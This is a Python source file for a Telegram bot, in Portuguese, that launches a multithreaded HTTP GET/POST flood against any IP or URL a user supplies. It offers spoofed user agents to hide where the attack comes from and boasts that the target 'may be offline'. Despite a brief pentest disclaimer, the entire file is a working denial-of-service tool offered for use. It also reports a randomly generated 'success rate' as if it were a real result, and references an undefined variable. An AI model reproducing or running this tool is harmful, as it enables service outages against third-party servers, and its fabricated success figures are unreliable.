from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler
import socket
import requests
import threading
import random
import time

# Definindo os estados para o ConversationHandler
IP_URL, REQUESTS, REQ_TYPE, THREADS, FAKE_USERS, AGENT_HEADER, START_ATTACK = range(7)

# Variáveis globais para armazenar dados do usuário
target_ip = ""
requests_count = 0
req_type = ""
threads_count = 0
fake_users = False
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
]
attack_duration = 0  # Tempo de ataque (em segundos)

def start(update, context):
    update.message.reply_text(
        "⚠️ **AVISO IMPORTANTE** ⚠️\n\n"
        "Este bot foi criado para **pentest** e **testes de segurança** em sistemas controlados. "
        "O uso não autorizado é **ilegal** e pode ser punido conforme a legislação brasileira. "
        "Use apenas em ambientes onde você tem permissão explícita para realizar os testes.\n\n"
        "**Atenção!** Este bot foi criado por spikeBebopdev e é **open-source**.\n"
        "📂 Código-fonte disponível em: https://github.com/spikeBebopdev/Telegram-DoS-Bot\n\n"
        "Se prepare, seu alvo vai ser testado agora! ⚡️\n\n"
        "Vamos começar, forneça o **IP ou URL** do alvo para o ataque!"
    )
    return IP_URL

def get_target(update, context):
    global target_ip
    user_input = update.message.text.strip()

    try:
        if user_input.startswith("http"):
            target_ip = socket.gethostbyname(user_input.split('/')[2])  # Extrai o IP do URL
        else:
            target_ip = socket.gethostbyname(user_input)  # Resolve o IP
        update.message.reply_text(f"🔥 **ALVO LOCALIZADO**: {target_ip}\n\n")
        update.message.reply_text("🛠️ Quantas **requisições** deseja enviar? Se quer um ataque mais agressivo, envie um número maior!")
        return REQUESTS
    except Exception as e:
        update.message.reply_text("⚠️ Falha ao resolver o IP. Tente novamente com um formato válido (ex: http://exemplo.com ou 192.168.1.1).")
        return IP_URL

def get_requests(update, context):
    global requests_count
    try:
        requests_count = int(update.message.text.strip())
        update.message.reply_text("⚡️ Qual **tipo de requisição** deseja enviar? (GET/POST) Escolha sabiamente o tipo de ataque!")
        return REQ_TYPE
    except ValueError:
        update.message.reply_text("⚠️ Por favor, forneça um **número válido** de requisições.")
        return REQUESTS

def get_req_type(update, context):
    global req_type
    user_input = update.message.text.strip().upper()
    if user_input in ['GET', 'POST']:
        req_type = user_input
        update.message.reply_text("💥 Quantas **threads** deseja usar? Um número maior significa mais pressão sobre o servidor!")
        return THREADS
    else:
        update.message.reply_text("⚠️ Tipo inválido. Escolha entre **GET** ou **POST**.")
        return REQ_TYPE

def get_threads(update, context):
    global threads_count
    try:
        threads_count = int(update.message.text.strip())
        update.message.reply_text("💀 Deseja usar **usuários falsos/agentes** para disfarçar a origem do ataque? (sim/não) Quanto mais disfarces, mais difícil de rastrear!")
        return FAKE_USERS
    except ValueError:
        update.message.reply_text("⚠️ Forneça um **número válido** de threads.")
        return THREADS

def get_fake_users(update, context):
    global fake_users
    user_input = update.message.text.strip().lower()
    if user_input == "sim":
        fake_users = True
        update.message.reply_text("👾 **Usuários falsos ativados**. O ataque será mais difícil de rastrear!")
        update.message.reply_text("Escolha um **User-Agent** aleatório para camuflar ainda mais a origem!")
        return AGENT_HEADER
    elif user_input == "não":
        update.message.reply_text("🚫 **Usuários falsos desativados**. Vamos ser claros na origem.")
        return START_ATTACK
    else:
        update.message.reply_text("⚠️ Resposta inválida. Escolha **sim** ou **não**.")
        return FAKE_USERS

def get_agent_header(update, context):
    global user_agents
    agent_choice = random.choice(user_agents) if fake_users else None
    update.message.reply_text(f"🖥️ **User-Agent** aleatório selecionado: {agent_choice}")
    return START_ATTACK

def start_attack(update, context):
    global attack_duration
    start_time = time.time()
    update.message.reply_text(
        f"🚨 **ATAQUE INICIADO** 🚨\n\n"
        f"🔓 **ALVO**: {target_ip}\n"
        f"⚡️ **REQUISIÇÕES**: {requests_count}\n"
        f"🔧 **TIPO DE REQUISIÇÃO**: {req_type}\n"
        f"🧨 **THREADS**: {threads_count}\n"
        f"👾 **USUÁRIOS FALSOS**: {'Ativado' if fake_users else 'Desativado'}\n\n"
        "Prepare-se para o impacto total! 💥💥\n\n"
        "O ataque vai durar 60 segundos. Aguarde...\n\n"
        "Não há escapatória. O ataque está em andamento... 🚨"
    )
    attack_duration = 60  # Tempo de ataque em segundos
    attack(target_ip, requests_count, req_type, threads_count, fake_users, start_time)

    return ConversationHandler.END

def attack(target_ip, requests_count, req_type, threads_count, fake_users, start_time):
    def make_request():
        headers = {'User-Agent': random.choice(user_agents)} if fake_users else {}
        try:
            if req_type == 'GET':
                requests.get(f"http://{target_ip}", headers=headers)
            else:
                requests.post(f"http://{target_ip}", headers=headers)
        except Exception as e:
            pass  # Ignorar falhas

    threads = []
    while time.time() - start_time < attack_duration:
        for _ in range(threads_count):
            for _ in range(requests_count):
                thread = threading.Thread(target=make_request)
                threads.append(thread)
                thread.start()

    for thread in threads:
        thread.join()

    # Após o tempo do ataque, mostrar resultado
    end_time = time.time()
    attack_time = end_time - start_time
    success_rate = random.randint(80, 100)  # Exemplo de taxa de sucesso
    update.message.reply_text(
        f"⏳ **Ataque finalizado após {int(attack_time)} segundos!** ⏳\n\n"
        f"🔥 **Taxa de sucesso**: {success_rate}%\n"
        f"🔓 **Status do alvo**: O servidor pode estar **offline** ou sobrecarregado.\n\n"
        "**Ataque bem-sucedido!** O alvo foi **fortemente impactado**. 🚨💥"
    )

def cancel(update, context):
    update.message.reply_text("🛑 **Ataque cancelado**. Mas a luta contra a segurança continua!")
    return ConversationHandler.END

def main():
    # Substitua 'TOKEN' pelo token do seu bot
    updater = Updater("TOKEN", use_context=True)
    dp = updater.dispatcher

    conversation_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            IP_URL: [MessageHandler(Filters.text & ~Filters.command, get_target)],
            REQUESTS: [MessageHandler(Filters.text & ~Filters.command, get_requests)],
            REQ_TYPE: [MessageHandler(Filters.text & ~Filters.command, get_req_type)],
            THREADS: [MessageHandler(Filters.text & ~Filters.command, get_threads)],
            FAKE_USERS: [MessageHandler(Filters.text & ~Filters.command, get_fake_users)],
            AGENT_HEADER: [MessageHandler(Filters.text & ~Filters.command, get_agent_header)],
            START_ATTACK: [MessageHandler(Filters.text & ~Filters.command, start_attack)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    dp.add_handler(conversation_handler)
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()